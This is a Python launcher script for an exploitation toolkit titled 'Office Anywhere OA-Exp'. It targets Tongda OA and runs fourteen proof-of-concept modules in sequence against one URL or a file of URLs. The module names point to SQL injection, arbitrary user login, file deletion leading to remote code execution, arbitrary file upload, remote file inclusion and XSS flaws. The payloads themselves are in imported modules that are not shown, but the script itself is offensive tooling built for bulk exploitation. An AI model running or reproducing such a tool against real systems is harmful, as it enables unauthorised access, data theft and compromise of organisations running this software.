# -*- coding: utf-8 -*-
import time
import argparse
import multiprocessing
from pyfiglet import Figlet
from rich.console import Console
from poc import (通达OA_v11_5_swfupload_sql, 通达OA_v11_5_任意用户登录, 通达OA_v11_6_insert_sql, 通达OA_v11_6_report_bi_sql, 通达OA_v11_6_任意文件删除_RCE, 通达OA_v11_7_后台sql注入,通达OA_v11_7_在线用户登录, 通达OA_v11_8_api_任意文件上传, 通达OA_v11_8_getway_远程文件包含, 通达OA_v2014_get_contactlist, 通达OA_v2017_action_upload,通达OA_v2017_任意用户登录,通达OA_v11_8_logincheck,通达OA_v11_8_后台包含xss)

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    list = ['通达OA_v11_5_swfupload_sql', '通达OA_v11_5_任意用户登录','通达OA_v11_6_insert_sql',
            '通达OA_v11_6_report_bi_sql', '通达OA_v11_6_任意文件删除_RCE', '通达OA_v11_7_后台sql注入',
            '通达OA_v11_7_在线用户登录', '通达OA_v11_8_api_任意文件上传', '通达OA_v11_8_getway_远程文件包含',
            '通达OA_v2014_get_contactlist', '通达OA_v2017_action_upload', '通达OA_v2017_任意用户登录','通达OA_v11_8_logincheck','通达OA_v11_8_后台包含xss']
    for i in list:
        eval(i + ".main(target_url)")
        time.sleep(0.2)
    
if __name__ == '__main__':
    console.print(Figlet(font='slant').renderText('Office Anywhere OA-Exp'), style='bold blue')
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                console.print(now_time() + " [INFO]     正在检测:{}".format(url)+'\n', style='bold yellow')
                pool.apply(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            console.print(now_time() + " [INFO]     正在检测:{}".format(args.url)+'\n', style='bold yellow')
            main(args.url)
        else:
            console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.console.print('\nCTRL+C 退出', style='reverse bold red')
